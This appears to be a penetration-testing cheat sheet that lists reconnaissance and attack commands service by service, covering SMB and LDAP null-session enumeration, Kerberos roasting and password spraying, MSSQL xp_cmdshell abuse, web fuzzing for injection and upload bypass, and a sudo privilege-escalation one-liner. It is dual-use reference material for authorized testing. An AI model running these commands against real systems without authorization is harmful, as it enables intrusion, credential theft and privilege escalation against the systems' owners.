# Read Team Pentesting Methodology | CheatSheet
## Investigate
```bash
$ ping -c 1 <ip>
$ sudo netdiscover
$ sudo netdiscover -r 192.168.1.0/24
$ sudo nmap -sn 192.168.1.0/24 -T4 -Pn
$ traceroute <ip>
$ for x in 7000 8000 9000; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x 1.1.1.1; done (port knocking)
```
## nmap
```bash
$ nmap -p- -Pn -T4 -v <ip> -oN all_ports
$ nmap -p <ports> -Pn -T4 -sC -sV <ip>-oN normal
$ nmap -p- -Pn -T4 <ip> --script vuln -oN vuln-script
$ nmap -sU -T4 <ip> -oN udp-scan
$ ls /usr/share/nmap/scripts | grep smb
```
## dns
```bash
$ whois domain.com
$ dnsenum domain.com
$ dig ax domain.com @<ip>
$ dig mx domain.com @<ip>
$ dig any domain.com @<ip>
$ dig axfr domain.com @<ip>
$ host -l domain.com <ip>
$ for sub in $(cat subdomains.txt);do host $sub.domain.com|grep "has.address";done
$ dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
```
## rpc
```bash
$ rpcclient -N -U '' <ip>
$ rpcinfo -p <ip>
---------
$ enumdomusers
$ enumprinters
$ enumdomgroups
$ querygroup <0xrid>
$ querygroupmem <0xrid>
$ enumdomains
$ lsaquery (domain SID)
$ querydominfo
$ queryuser
```
## smb
```bash
$ smbclient -L //<ip>/
$ smbpasswd -r localhost -U user
$ smbcacls //server/share1 
$ nxc smb <ip> -u '' -p ''
$ nxc smb <ip> -u '' -p '' --users --shares --rid-brute --lsa --sam --ntds -X 'whoami' -spider -M spider_plus
$ nxc smb <ip> -u '' -p '' --pass-pol --no-bruteforce --continue-on-succes
$ sudo mount -t cifs -o 'username=user,password=' //<ip>/share /mnt
$ enum4linix-ng host
$ smbmap -H <ip>
```
## ftp
```bash
$ ftp user@<ip>
$ nxc ftp <ip> -u '' -p '' --ls --get file.txt --put file.txt
```
## nfs
```bash
$ sudo nmap -sV --script rpcinfo 10.10.13.37 -p111
$ sudo nmap -sV --script 'nfs*' 10.10.13.37 -p2049
$ showmount -e <ip>
$ sudo mount -v -t nfs -o vers=3 -o nolock -o user=username,pass='Pass' <ip>:/home /mnt/nfs
```
## ldap
```bash
$ ldeep ldap -a -d domain.com -s ldap://domain.com:389 users -v
$ ldeep ldap -a -d domain.com -s ldap://domain.com:389 computers -v
$ ldeep ldap -a -d domain.com -s ldap://domain.com:389 all -v
$ nxc ldap <ip> -u '' -p '' --bloodhound --users --groups --dc-list --get-sid 
```
## SMTP
```bash
$ smtp-user-enum -U /usr/share/wordlists/names.txt -t <ip> -m 150
```
## POP3
```bash
telnet <ip> 110
# USER [username]
# PASS [password]
# LIST
# RETR [message number]
# QUIT
```
## mySQL
```bash
$ nmap -sV -Pn <ip> -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122
```
## MSSQL
```bash
$ nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
$ mssqlclient.py -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
$ xp_cmdshell
$ xp_dirtree \\remote_server\share
$ xp_dirtree C:\ (Can be abused like LFI)
```
## Kerberos
```bash
$ kerbrute userenum --dc <ip> -d domain.com /opt/SecLists/Usernames/xato-net-10-million-usernames.txt
$ kerbrute passwordspray --dc <ip> -d domain.com /opt/SecLists/Usernames/xato-net-10-million-usernames.txt Password!
$ GetNPUsers.py DOMAIN.COM/User:password -dc-ip ip -dc-host domain.com -no-pass -k -hashes -request -usersfile users.txt -output output.txt
$ GetUserSPNs.py DOMAIN.COM/User:password -dc-ip ip -dc-host domain.com -no-pass -k -hashes -request -usersfile users.txt -output output.txt
$ nxc ldap <ip> -u '' -p '' --asreproast --kerberoasting 
```
## SNMP
```bash
$ snmp-check <ip>
$ snmp-check -v 2c -c public <ip>
$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.13.37
$ nmap --script "snmp* and not snmp-brute" <target>
$ snmpbulkwalk -c public -v2c <ip> .
```
## HTTP
1.Check html code, try to enumerate a cms
2.Look at http headers, info leak?
3.Check every folder that fuzzed. 
4.Searchsploit, Google, Github for CVE.
5.Read every post and try every exploit.

### Login Page
Try admin:admin? :)
Try default credentials for this application.
Try bunch of simple passwords.
Try basic sql, sql in REGISTER also.

### UPLOAD
Bruteforce every extension.
Try reverse extension, null bytes, lowercase-uppercase?
Try to upload .htaccess
GIF89a;

### Check this vulnerabilities:
#### sqlInjection
#### SSTI
#### SSRF(U can enumerate a internal services, if host is Windows maybe NTLM hash?)
#### Command Injection
#### LFI/RFI
```bash
$ curl -I http://localhost (Check Response Headers for info leak)
$ whatweb http://localhost
$ gobuster vhost -u http://localhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
$ ffuf -u http://localhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'HOST: FUZZ.domain.com' -fs xxx
$ nikto -h http://localhost
$ ffuf -u http://localhost/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
$ ffuf -u http://localhost/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -e php,txt,zip,html,asp,aspx
$ ffuf -u http://localhost/FUZZ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
$ gobuster dir -u http://localhost -w -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -x php,txt,zip,html
$ feroxbuster -u http://localhost -x php
$ ffuf -u http://localhost/example.php?file=FUZZ -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt (LFI)
$ ffuf -u http://localhost/example.php?FUZZ=key -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt (Paramter Fuzzing)
$ ffuf -u http://localhost/example/api/v1/FUZZ -w /opt/SecLists/Discovery/Web-Content/api/api-seen-in-wild.txt (api)
$  ffuf -u http://localhost/example.php/id=FUZZ -w /opt/SecLists/Fuzzing/special-chars.txt -d 'id=FUZZ' (Special Chars)
```

## Linux
*manual enum*
```bash
$ Check manually folders and files, read carefully every file.
$ ls -la
$ id
$ sudo -l
$ uname -a
$ netstat -ano
$ df -h
$ top
$ netstat -tulpn
$ ss -lntu 
$ find / -perm -4000 -o -perm -2000 -type f 2>/dev/null
$ cat /proc/version || uname -a
$ echo $PATH
$ echo $BASH
$ env
$ searchsploit sudo
$ sudo < v1.28 > sudo -u#-1 /bin/bash
$ ps aux
$ ps -ef
$ crontab -l
$ cat /etc/crontab
```
*automated enum*
```bash
$ linpeas.sh (carefully read output)
$ lse.sh
$ pspy64
```
